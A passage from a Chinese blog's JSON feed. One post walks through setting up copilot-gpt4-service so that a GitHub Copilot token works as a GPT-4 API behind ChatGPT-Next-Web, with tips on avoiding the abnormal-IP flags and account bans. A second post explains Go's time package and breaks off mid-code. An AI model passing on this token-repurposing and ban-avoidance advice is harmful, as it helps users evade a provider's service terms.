类型的提供商进行部署，频繁更换 ip 容易被判断为异常。</p>\n<h2 id=\"获取-copilot-token\"><a class=\"anchor\" href=\"#获取-copilot-token\">#</a> 获取 copilot token</h2>\n<p>按照 github 的教程 走 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FhYW1vb24vY29waWxvdC1ncHQ0LXNlcnZpY2UvYmxvYi9tYXN0ZXIvUkVBRE1FX0NOLm1kIyVFOCU4RSVCNyVFNSU4RiU5Ni1jb3BpbG90LXRva2Vu\">https://github.com/aaamoon/copilot-gpt4-service/blob/master/README_CN.md# 获取 - copilot-token</span></p>\n<h2 id=\"在外网服务器上搭建-copilot-gpt4-service\"><a class=\"anchor\" href=\"#在外网服务器上搭建-copilot-gpt4-service\">#</a> 在外网服务器上搭建 copilot-gpt4-service</h2>\n<p>由于本文使用的外网服务器性能一般，并且没有安装 docker，所以直接使用二进制文件进行搭建。</p>\n<h3 id=\"下载二进制文件\"><a class=\"anchor\" href=\"#下载二进制文件\">#</a> 下载二进制文件</h3>\n<p>截至发布文章当日，该项目还没有进行 release 文件，所以目前使用 github action 编译出来的二进制文件</p>\n<p>在这里面找一个已经编译好的二进制文件 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FhYW1vb24vY29waWxvdC1ncHQ0LXNlcnZpY2UvYWN0aW9ucy93b3JrZmxvd3MvYnVpbGQueW1s\">https://github.com/aaamoon/copilot-gpt4-service/actions/workflows/build.yml</span></p>\n<p>比如 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FhYW1vb24vY29waWxvdC1ncHQ0LXNlcnZpY2UvYWN0aW9ucy9ydW5zLzc5OTg0NTc2OTk=\">https://github.com/aaamoon/copilot-gpt4-service/actions/runs/7998457699</span></p>\n<p>选择机器对应的二进制文件比如 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FhYW1vb24vY29waWxvdC1ncHQ0LXNlcnZpY2UvYWN0aW9ucy9ydW5zLzc5OTg0NTc2OTkvYXJ0aWZhY3RzLzEyNjUwMTUyNzk=\">copilot-gpt4-service-linux-amd64</span></p>\n<p>下载下来，scp 到云服务器上</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">scp</span> /path/to/copilot-gpt4-service-linux-amd64.zip root@ip:/home/user/copilot</pre></td></tr></table></figure><p>进入云服务器，解压文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">unzip</span> copilot-gpt4-service-linux-amd64.zip</pre></td></tr></table></figure><h3 id=\"配置文件\"><a class=\"anchor\" href=\"#配置文件\">#</a> 配置文件</h3>\n<p>在  <code>copilot-gpt4-service</code>  所在目录下 新建文件 <code>config.env</code>  内容为</p>\n<pre><code class=\"language-conf\">HOST=0.0.0.0\nPORT=8080\nCACHE=true\nCACHE_PATH=db/cache.sqlite3\nDEBUG=false\nLOGGING=true\nLOG_LEVEL=info\nCOPILOT_TOKEN=xxxx\nSUPER_TOKEN=xxxx\nENABLE_SUPER_TOKEN=true\nRATE_LIMIT=10\nCORS_PROXY_NEXTCHAT=true\n</code></pre>\n<p>启动服务</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 新增运行权限</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">chmod</span> +x copilot-gpt4-service</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>./copilot-gpt4-service</pre></td></tr></table></figure><h3 id=\"反向代理\"><a class=\"anchor\" href=\"#反向代理\">#</a> 反向代理</h3>\n<p>由于这台机器上还搭建了其他服务，所以我反向代理到 80 端口，监听服务名称</p>\n<pre><code class=\"language-conf\">server &#123;\n   listen       80;\n   server_name  copilot.example.com;\n   location / &#123;\n            proxy_pass http://127.0.0.1:8123/;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_set_header X-Forwarded-Host $http_host;\n    &#125;\n&#125;\n</code></pre>\n<h3 id=\"配置https\"><a class=\"anchor\" href=\"#配置https\">#</a> 配置 https</h3>\n<p>https 这边用的是 cloudflare 提供的 https，不需要再单独设置 https，直接使用项目 README 里的 https 教程也可以。</p>\n<p>这边配置域名为 <span class=\"exturl\" data-url=\"aHR0cDovL2NvcGlsb3QuZXhhbXBsZS5jb20=\">copilot.example.com</span></p>\n<h1 id=\"搭建-chatgpt-next-web\"><a class=\"anchor\" href=\"#搭建-chatgpt-next-web\">#</a> 搭建 ChatGPT-Next-Web</h1>\n<p>按照教程 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NoYXRHUFROZXh0V2ViL0NoYXRHUFQtTmV4dC1XZWIvYmxvYi9tYWluL1JFQURNRV9DTi5tZA==\">https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/README_CN.md</span></p>\n<p>在 Vercel 上搭建 ChatGPT-Next-Web</p>\n<p>环境变量设置</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BASE_URL: https://copilot.example.com/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>OPENAI_API_KEY: xxx <span class=\"token comment\"># 为 copilot-gpt4-service 配置的 SUPER_TOKEN</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CODE:xxxx <span class=\"token comment\">#密码</span></pre></td></tr></table></figure><p>Vercel 绑定域名 <span class=\"exturl\" data-url=\"aHR0cDovL2NoYXQuZXhhbXBsZS5jb20=\">chat.example.com</span></p>\n<h1 id=\"效果\"><a class=\"anchor\" href=\"#效果\">#</a> 效果</h1>\n<p>已经使用三天时间了，copilot 没有被封，效果也还行。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202402251051816.png\" alt=\"image-20240225105128755\" /></p>\n<p>日志</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202402251052599.png\" alt=\"image-20240225105214295\" /></p>\n",
            "tags": [
                "计算机科学",
                "Project",
                "github"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/Go/Lib/time/",
            "url": "https://blog.twelveeee.top/2023/Go/Lib/time/",
            "title": "Go 标准库源码解析-Time",
            "date_published": "2023-12-26T06:00:00.000Z",
            "content_html": "<h1 id=\"日期与时间\"><a class=\"anchor\" href=\"#日期与时间\">#</a> 日期与时间</h1>\n<h2 id=\"location\"><a class=\"anchor\" href=\"#location\">#</a> Location</h2>\n<p>时区</p>\n<p>常用的几个时区：</p>\n<ul>\n<li>GMT: 格林尼治标准时间。</li>\n<li>UTC: 世界协调时间。</li>\n<li>DST: 夏日节约时间（夏令时）。</li>\n<li>CST: 表示包含中国北京时间在内的时区，等于 UTC+8。</li>\n</ul>\n<p><code>time</code>  包提供了 Location 的两个实例： <code>Local</code>  和  <code>UTC</code> 。<br />\n <code>Local</code>  代表当前系统本地时区；<br />\n <code>UTC</code>  代表通用协调时间，也就是零时区。<br />\n <code>time</code>  包默认（为显示提供时区）使用  <code>UTC</code>  时区。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// Location 将时间映射到当时正在使用的时区。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// Location 通常用来表示地理位置中的时间偏移的集合。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 对于许多位置，时间偏移会根据夏令时而变化</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">type</span> Location <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tname <span class=\"token builtin\">string</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tzone <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>zone</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\ttx   <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>zoneTrans</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">//tzdata 信息后面可以跟一个字符串，描述如何处理 zoneTrans 中未记录的 DST 转换。 格式为 TZ 环境变量，不带冒号；</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">// https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap08.html.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\">// 例如 America/Los_Angeles: PST8PDT,M3.2.0,M11.1.0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\textend <span class=\"token builtin\">string</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">// 大多数查找都是针对当前时间的。</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token comment\">// 为了避免通过 tx 进行二分搜索，请保持静态单元素缓存，该缓存在创建位置时提供正确的区域。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">// 如果 cacheStart &lt;= t &lt; cacheEnd，查找返回 cacheZone。</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">//cacheStart 和 cacheEnd 是时间戳</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tcacheStart <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tcacheEnd   <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tcacheZone  <span class=\"token operator\">*</span>zone</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">FixedZone</span><span class=\"token punctuation\">(</span>name <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> offset <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>Location</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">LoadLocation</span><span class=\"token punctuation\">(</span>name <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>Location<span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">LoadLocationFromTZData</span><span class=\"token punctuation\">(</span>name <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> data <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>Location<span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>Unix 系统以标准格式存于文件中，这些文件位于  <code>/usr/share/zoneinfo</code> <br />\n 本地时区可以通过  <code>/etc/localtime</code>  获取，这是一个符号链接，指向  <code>/usr/share/zoneinfo</code>  中某一个时区。<br />\n因此，在初始化 Local 时，通过读取  <code>/etc/localtime</code>  可以获取到系统本地时区。<br />\n当然，如果设置了环境变量  <code>TZ</code> ，则会优先使用它。</p>\n<p><strong>用法</strong></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\ttime<span class=\"token punctuation\">.</span>Local <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">FixedZone</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CST\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">60</span><span class=\"token operator\">*</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\td <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Date</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>UTC<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span>         <span class=\"token comment\">// 2023-12-01 01:56:24 +0000 UTC</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">Local</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 2023-12-01 09:56:24 +0800 CST</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">UTC</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">// 2023-12-01 01:56:24 +0000 UTC</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">// 时区转换，区分大小写。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tloc<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">LoadLocation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Asia/Shanghai\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tt <span class=\"token operator\">:=</span> d<span class=\"token punctuation\">.</span><span class=\"token function\">In</span><span class=\"token punctuation\">(</span>loc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">Location</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// Asia/Shanghai</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">Zone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\">// CST 28800</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">// 比较时间时，会考虑时区。</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>d <span class=\"token operator\">==</span> t<span class=\"token punctuation\">)</span>     <span class=\"token comment\">// false</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">Equal</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tt <span class=\"token operator\">=</span> t<span class=\"token punctuation\">.</span><span class=\"token function\">AddDate</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">Before</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">After</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">// false</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"time\"><a class=\"anchor\" href=\"#time\">#</a> Time</h2>\n<p>纳秒进度的时间。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> Time <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">//wall 和 ext 编码了现实时间 (wall time) 的秒数、纳秒数和可选的单调时钟读数（以纳秒为单位）。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// 从高到低的位顺序，wall 编码了一个 1 位标志（hasMonotonic）、一个 33 位秒数字段和一个 30 位现实时间纳秒数字段。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token comment\">// 纳秒数字段的范围是 [0, 999999999]。</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// 如果 hasMonotonic 位为 0，则 33 位字段必须为零，并且完整的有符号 64 位墙秒数（自公元 1 年 1 月 1 日起）存储在 ext 中。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// 如果 hasMonotonic 位为 1，则 33 位字段包含自 1885 年 1 月 1 日起的 33 位无符号墙秒数，并且 ext 包含有符号的 64 位单调时钟读数（自进程启动以来的纳秒数）。</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\twall <span class=\"token builtin\">uint64</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\text  <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\">//loc 指定用于确定与此 Time 对应的分钟、小时、月份、日期和年份的位置（Location）。</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">//nil 位置表示 UTC。</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">// 所有 UTC 时间都用 loc==nil 表示，而不是 loc==&amp;utcLoc。</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tloc <span class=\"token operator\">*</span>Location</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>生成 Time</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 返回当前时间</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> Time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 按照日期构造时间</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Date</span><span class=\"token punctuation\">(</span>year <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> month Month<span class=\"token punctuation\">,</span> day<span class=\"token punctuation\">,</span> hour<span class=\"token punctuation\">,</span> min<span class=\"token punctuation\">,</span> sec<span class=\"token punctuation\">,</span> nsec <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> loc <span class=\"token operator\">*</span>Location<span class=\"token punctuation\">)</span> Time</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 按照指定格式解析字符串</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Parse</span><span class=\"token punctuation\">(</span>layout<span class=\"token punctuation\">,</span> value <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>Time<span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 按照指定格式解析字符串，带时区信息</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">ParseInLocation</span><span class=\"token punctuation\">(</span>layout<span class=\"token punctuation\">,</span> value <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> loc <span class=\"token operator\">*</span>Location<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>Time<span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 自 1970-1-1 00:00:00 UTC 开始到现在的秒数、毫秒数、微秒数。</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Unix</span><span class=\"token punctuation\">(</span>sec <span class=\"token builtin\">int64</span><span class=\"token punctuation\">,</span> nsec <span class=\"token builtin\">int64</span><span class=\"token punctuation\">)</span> Time</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">UnixMicro</span><span class=\"token punctuation\">(</span>usec <span class=\"token builtin\">int64</span><span class=\"token punctuation\">)</span> Time</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">UnixMilli</span><span class=\"token punctuation\">(</span>msec <span class=\"token builtin\">int64</span><span class=\"token punctuation\">)</span> Time</pre></td></tr></table></figure><p><strong>demo:</strong></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\ttNow <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\ttDate <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Date</span><span class=\"token punctuation\">(</span>tNow<span class=\"token punctuation\">.</span><span class=\"token function\">Year</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tNow<span class=\"token punctuation\">.</span><span class=\"token function\">Month</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tNow<span class=\"token punctuation\">.</span><span class=\"token function\">Day</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>Local<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\ttParse<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Parse</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2006-01-02 15:04:05\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2023-01-01 00:00:00\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"time.Now(): \\t\"</span><span class=\"token punctuation\">,</span> tNow<span class=\"token punctuation\">,</span> <span class=\"token string\">\",\"</span><span class=\"token punctuation\">,</span> tNow<span class=\"token punctuation\">.</span><span class=\"token function\">UnixNano</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"time.Date(): \\t\"</span><span class=\"token punctuation\">,</span> tDate<span class=\"token punctuation\">,</span> <span class=\"token string\">\",\"</span><span class=\"token punctuation\">,</span> tDate<span class=\"token punctuation\">.</span><span class=\"token function\">UnixNano</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"time.Parse(): \\t\"</span><span class=\"token punctuation\">,</span> tParse<span class=\"token punctuation\">,</span> <span class=\"token string\">\",\"</span><span class=\"token punctuation\">,</span> tParse<span class=\"token punctuation\">.</span><span class=\"token function\">UnixNano</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// time.Now():      2023-12-25 13:51:09.368530458 +0000 UTC m=+0.000030840 , 1703512269368530458</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// time.Date():     2023-12-25 00:00:00 +0000 UTC , 1703462400000000000</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// time.Parse():    2023-01-01 00:00:00 +0000 UTC , 1672531200000000000</span></pre></td></tr></table></figure><p>方法</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 判空</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">IsZero</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 返回时间</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>year <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> month Month<span class=\"token punctuation\">,</span> day <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Clock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>hour<span class=\"token punctuation\">,</span> min<span class=\"token punctuation\">,</span> sec <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 对比时间</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token 